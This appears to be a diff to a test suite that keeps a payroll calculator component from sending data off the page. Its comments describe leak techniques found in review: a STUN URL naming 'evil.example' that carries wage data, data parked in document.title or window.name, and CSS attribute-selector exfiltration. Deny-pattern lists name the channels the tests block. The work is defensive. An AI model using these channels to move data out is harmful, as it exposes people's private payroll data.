@@ -54,9 +54,56 @@ const DATA_FILES = [
 
 const ALL = [COMPONENT, ...ENGINE_FILES, ...DATA_FILES];
 
-/** Strip comments so prose ABOUT `fetch` cannot fail a code assertion. */
-const code = (src: string) =>
-  src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:])\/\/.*$/gm, '$1');
+/**
+ * Strip comments so prose ABOUT `fetch` cannot fail a code assertion.
+ *
+ * STRING-AWARE, and it has to be. The obvious two-regex version —
+ *
+ *     src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:])\/\/.*$/gm, '$1')
+ *
+ * — treats a `//` INSIDE a string literal as the start of a comment. So
+ * `const a = "//evil.example/x"` was handed to the assertions as `const a = "`,
+ * and the protocol-relative check three hundred lines below could never fire on
+ * the one construct it exists to catch. A review pass found it by reading the
+ * helper rather than the rules, which is the right place to look: a gate's
+ * preprocessing is the part nobody tests.
+ *
+ * This walks the source once, tracking whether it is inside '', "", `` or a
+ * comment, and removes only real comments. String CONTENT is preserved intact,
+ * because for this file the content of a string literal is the evidence.
+ */
+function code(src: string): string {
+  let out = '';
+  let i = 0;
+  let quote: string | null = null;
+  while (i < src.length) {
+    const c = src[i];
+    const next = src[i + 1];
+    if (quote) {
+      out += c;
+      if (c === '\\') { out += next ?? ''; i += 2; continue; }
+      if (c === quote) quote = null;
+      i++;
+      continue;
+    }
+    if (c === "'" || c === '"' || c === '`') { quote = c; out += c; i++; continue; }
+    if (c === '/' && next === '/') {
+      while (i < src.length && src[i] !== '\n') i++;
+      continue;
+    }
+    if (c === '/' && next === '*') {
+      const end = src.indexOf('*/', i + 2);
+      const chunk = src.slice(i, end === -1 ? src.length : end + 2);
+      // Preserve newlines so reported line numbers stay true.
+      out += chunk.replace(/[^\n]/g, '');
+      i = end === -1 ? src.length : end + 2;
+      continue;
+    }
+    out += c;
+    i++;
+  }
+  return out;
+}
 
 /**
  * Strip string literals as well, for the assertions that are about what the
@@ -282,6 +329,97 @@ describe('no external origin can be referenced at all', () => {
     for (const l of literals) {
       expect(l.includes('http'), `string literal contains a scheme: "${l}"`).toBe(false);
       expect(l.includes('//'), `string literal contains "//": "${l}"`).toBe(false);
+    }
+  });
+
+  /**
+   * ANY URI scheme, not just http.
+   *
+   * A review pass designed a leak that carried the net wage and the Article-9
+   * church flag out through `new RTCPeerConnection({ iceServers: [{ urls:
+   * 'stun:' + tag + '.evil.example' }] })`. It defeated both layers at once: the
+   * source gate knew only `http` and `//`, and the Playwright wire watcher
+   * observes HTTP requests, so a STUN/UDP resolution and its DNS lookup are
+   * invisible to it.
+   *
+   * The fix is not to add `stun` to a list. It is to stop enumerating schemes:
+   * this component has no business naming ANY scheme, so any `word:` that looks
+   * like one fails.
+   */
+  it('names no URI scheme of any kind', () => {
+    const literals = Array.from(src.matchAll(/'((?:[^'\\\n]|\\.)*)'|"((?:[^"\\\n]|\\.)*)"|`((?:[^`\\]|\\.)*)`/g), (m) =>
+      m[1] ?? m[2] ?? m[3] ?? '',
+    );
+    for (const l of literals) {
+      const m = /\b([a-z][a-z0-9+.-]{1,15}):/i.exec(l);
+      // A bare "word:" inside prose is not a scheme; require it to be the whole
+      // literal's start or to be followed by something URL-shaped.
+      if (m && /^[a-z][a-z0-9+.-]{1,15}:(\/\/|[a-z0-9])/i.test(l.trim())) {
+        expect.fail(`string literal names a URI scheme: "${l.slice(0, 60)}"`);
+      }
+    }
+  });
+
+  /**
+   * Sinks that issue a request without any of the APIs already listed, and
+   * ambient browser state that leaves the machine without this code issuing a
+   * request at all.
+   *
+   * The second half matters because a third-party analytics bundle is mounted
+   * on this page by the site chrome. Parking a payroll figure in
+   * `document.title` or `window.name` hands it to that bundle without this
+   * component making a single request — and the component was exempt from the
+   * browser-global purity check that covers the engine.
+   */
+  it('opens no other request channel and parks nothing in ambient state', () => {
+    const CHANNELS: Array<[string, RegExp]> = [
+      ['RTCPeerConnection', /RTCPeerConnection/],
+      ['window.open', /\bopen\s*\(/],
+      ['<object data>', /<object\b|\bdata\s*=\s*\{/i],
+      ['<embed>', /<embed\b/i],
+      ['anchor ping', /\bping\s*=/],
+      ['formAction', /formAction/i],
+      ['meta refresh', /http-equiv/i],
+      ['navigator.*', /\bnavigator\s*\./],
+      ['importScripts / worker', /importScripts|new\s+Worker|serviceWorker/],
+    ];
+    for (const [label, re] of CHANNELS) {
+      expect(re.test(src), `${label} is present in the calculator`).toBe(false);
+    }
+
+    const AMBIENT: Array<[string, RegExp]> = [
+      ['document.title', /document\s*\.\s*title/],
+      ['window.name', /window\s*\.\s*name/],
+      ['history.state', /history\s*\.\s*(state|pushState|replaceState)/],
+      ['document.cookie', /document\s*\.\s*cookie/],
+      ['any window access', /\bwindow\s*\./],
+      ['any document access', /\bdocument\s*\./],
+    ];
+    for (const [label, re] of AMBIENT) {
+      expect(re.test(src), `${label} is written by the calculator`).toBe(false);
+    }
+  });
+
+  /**
+   * No attribute carries a computed value out to CSS.
+   *
+   * The leak this closes is a two-file conspiracy: a `data-net={netCent}` on the
+   * results div plus one attribute-selector rule in styles.css, which no test in
+   * this suite reads, exfiltrating digit by digit through background-image
+   * requests. Neither file alone looks wrong.
+   *
+   * `data-severity` on the notes list is the one attribute that legitimately
+   * varies, and it carries a fixed vocabulary of three words, none of them
+   * derived from an input.
+   */
+  it('puts no computed value into a data attribute', () => {
+    const attrs = Array.from(src.matchAll(/\b(data-[a-z-]+)\s*=\s*(\{[^}]*\}|"[^"]*")/g), (m) => [m[1], m[2]] as const);
+    for (const [name, value] of attrs) {
+      if (name === 'data-severity') {
+        expect(value, 'data-severity must carry the note severity and nothing else').toBe('{n.severity}');
+        continue;
+      }
+      expect(/^"[a-z-]*"$/.test(value), `${name} carries a computed value: ${value}`).toBe(true);
     }
   });
 
